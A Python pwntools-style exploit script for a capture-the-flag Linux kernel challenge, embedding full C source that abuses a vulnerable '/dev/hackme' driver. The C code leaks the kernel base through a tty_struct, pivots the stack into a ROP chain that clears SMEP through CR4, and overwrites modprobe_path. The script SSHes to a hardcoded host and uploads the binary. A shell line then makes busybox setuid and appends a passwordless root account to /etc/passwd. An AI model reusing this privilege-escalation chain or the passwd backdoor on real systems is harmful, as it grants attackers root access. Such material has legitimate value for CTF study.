#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './startvm.sh'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SSH')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        remote  = {'user':'pwn', 'password':'pwn', 'host':'35.221.78.115', 'port':10022, 'raw':True})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = generate_exploit('/home/pwn/add_admin.sh')

    for s in [exploit[i: i+0x80] for i in range(0, len(exploit), 0x80)]:
        conn.sendlineafter('$', 'echo {} >> exploit.b64'.format(s)) 

    conn.sendlineafter('$', 'base64 -d exploit.b64 > exploit'.format(exploit)) 
    conn.sendlineafter('$', 'chmod +x exploit') 

    conn.sendlineafter('$', 'echo -ne "#!/bin/sh\nchmod u+s /bin/busybox\necho admin::0:0::/root:/bin/sh >> /etc/passwd\n" > add_admin.sh') 
    conn.sendlineafter('$', 'chmod +x add_admin.sh') 

    conn.sendlineafter('$', 'echo -ne "\\xff\\xff\\xff\\xff" > a') 
    conn.sendlineafter('$', 'chmod +x a') 

    conn.sendlineafter('$', './exploit') 
    conn.sendlineafter('$', './a') 
    conn.sendlineafter('$', 'su admin -') 

    # *CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}

def generate_exploit(path):
    code = '''
// gcc exploit_minimal.c -masm=intel -fno-PIE -nostdlib -no-pie -o exploit
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memcpy(void *dest, const void *src, size_t n);

void return_user(void* func);

static void save_state(void);
static void restore_state(void);

struct state {{
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;
}} stat;

/* exploit */
#define BASE		0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

unsigned long kernel_base			= 0;
unsigned long ofs_pty_unix98_ops		= OFFSET(0xffffffff81625c60);
unsigned long ofs_modprobe_path			= OFFSET(0xffffffff8183f960);

unsigned long ofs_stack_pivot 			= OFFSET(0xffffffff81083b55);	// mov esp, 0xF6000000 ; ret
unsigned long ofs_pop_rdi			= OFFSET(0xffffffff81033de0);	// pop rdi ; ret
unsigned long ofs_pop_rax			= OFFSET(0xffffffff8101b5a1);	// pop rax ; ret
unsigned long ofs_popfq				= OFFSET(0xffffffff8101b5b1);	// popfq ; ret
unsigned long ofs_popfq_pop			= OFFSET(0xffffffff8100252f);	// popfq  ; pop rbp ; ret
unsigned long ofs_mov_rdi_rax_pop		= OFFSET(0xffffffff810161ae);	// mov rdi, rax ; rep movsq  ; pop rbp ; ret
unsigned long ofs_mov_cr4_eax_pop1		= OFFSET(0xffffffff8100252b);	// mov cr4, eax ; push rcx ; popfq  ; pop rbp ; ret

char *modprobe_path;

struct hackme {{
	unsigned int index;
	void *addr;
	unsigned long size;
	unsigned long offset;
}};

static int hm_add(int fd, unsigned long id, void *buf, unsigned long size);
static int hm_delete(int fd, unsigned long id);
static int hm_edit(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset);
static int hm_read(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset);

void _start(void){{
	int fd, pfd;
	unsigned long tty_struct[0x400/sizeof(unsigned long)] = {{}};
	unsigned long fake_operation[0x20] = {{}};
	unsigned long *fake_stack;
	unsigned long kernel_stack[0x10] = {{}};

	save_state();

	if((fd = open("/dev/hackme", O_RDONLY)) < 0){{
		exit(-1);
	}}

	pfd = open("/dev/ptmx", O_NOCTTY|O_RDWR);
	hm_add(fd, 0, tty_struct, 0x400);
	hm_read(fd, 0, tty_struct, 0x400, -0x400);

	unsigned long pty_unix98_ops	= tty_struct[3];
	kernel_base			= pty_unix98_ops - ofs_pty_unix98_ops;
	modprobe_path 		= ADDR(ofs_modprobe_path);

	unsigned long kernel_heap	= tty_struct[8]-0x38 + 0x400;

	fake_operation[0x15] = ADDR(ofs_popfq_pop);
	fake_operation[0x13] = ADDR(ofs_stack_pivot);
	hm_edit(fd, 0, fake_operation, sizeof(fake_operation), 0);

	tty_struct[0x3] = kernel_heap;
	hm_edit(fd, 0, tty_struct, 0x400, -0x400);

	if((fake_stack = mmap((void*)(0xf6000000-0x1000), 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) != (void*)(0xf6000000-0x1000)){{
		exit(-3);
	}}
	fake_stack += (0x1000/sizeof(unsigned long));
	*(fake_stack++) = ADDR(ofs_pop_rax);
	*(fake_stack++) = 0x6b0;						// new cr4
	*(fake_stack++) = ADDR(ofs_mov_cr4_eax_pop1);
	*(fake_stack++) = 0xdeadbeef;
	*(fake_stack++) = ADDR(ofs_popfq);
	*(fake_stack++) = 0x40202;						// new rflags
	*(fake_stack++) = ADDR(ofs_pop_rdi);
	*(fake_stack++) = exit;
	*(fake_stack++) = return_user;

	close(pfd);
}}

static int hm_add(int fd, unsigned long id, void *buf, unsigned long size){{
	struct hackme req = {{
		.index = id,
		.addr = buf,
		.size = size,
		.offset = 0,
	}};
	return ioctl(fd, 0x30000, &req);
}}

static int hm_delete(int fd, unsigned long id){{
	struct hackme req = {{
		.index = id,
		.addr = NULL,
		.size = 0,
		.offset = 0,
	}};
	return ioctl(fd, 0x30001, &req);
}}

static int hm_edit(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset){{
	struct hackme req = {{
		.index = id,
		.addr = buf,
		.size = size,
		.offset = offset,
	}};
	return ioctl(fd, 0x30002, &req);
}}

static int hm_read(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset){{
	struct hackme req = {{
		.index = id,
		.addr = buf,
		.size = size,
		.offset = offset,
	}};
	return ioctl(fd, 0x30003, &req);
}}

/* funcs */
static void save_state(void) {{
	register long *rsp asm("rsp");

	asm(
	"mov rax, ss\\n"
	"push rax\\n"
	"lea rax, [rsp+0x18]\\n"
	"push rax\\n"
	"pushfq\\n"
	"mov rax, cs\\n"
	"push rax\\n"
	"mov rax, [rbp+8]\\n"
	"push rax\\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
    asm("add rsp, 0x28");
}}

static void restore_state(void){{
	register long *rsp asm("rsp");

    asm("sub rsp, 0x28");
	memcpy(rsp, &stat, sizeof(stat));
    asm(
	"swapgs\\n"
	"iretq"
	);
	__builtin_unreachable();
}}

void return_user(void* func){{
	char new_path[] = "{}";
	memcpy(modprobe_path, new_path, sizeof(new_path));

	stat.rip = func;
	restore_state();
}}

void *memcpy(void *dest, const void *src, size_t n){{
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}}

asm(
"read:\\n"
"mov rax, 0\\n"
"syscall\\n"
"ret\\n"

"write:\\n"
"mov rax, 1\\n"
"syscall\\n"
"ret\\n"

"open:\\n"
"mov rax, 2\\n"
"syscall\\n"
"ret\\n"

"close:\\n"
"mov rax, 3\\n"
"syscall\\n"
"ret\\n"

"mmap:\\n"
"mov rax, 9\\n"
"mov r10, rcx\\n"
"syscall\\n"
"ret\\n"

"mprotect:\\n"
"mov rax, 10\\n"
"syscall\\n"
"ret\\n"

"munmap:\\n"
"mov rax, 11\\n"
"syscall\\n"
"ret\\n"

"ioctl:\\n"
"mov rax, 16\\n"
"syscall\\n"
"ret\\n"

"execve:\\n"
"mov rax, 59\\n"
"syscall\\n"
"ret\\n"

"exit:\\n"
"mov rax, 60\\n"
"syscall\\n"
);
    '''.format(path)

    program = tempfile.mktemp()
    source  = program + ".c"
    write(source, code)

    process('gcc {} -masm=intel -fno-PIE -nostdlib -no-pie -o {}'.format(source, program).split()).wait_for_close()
    exploit = base64.b64encode(open(program).read())

    os.unlink(program)
    os.unlink(source)

    return exploit

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
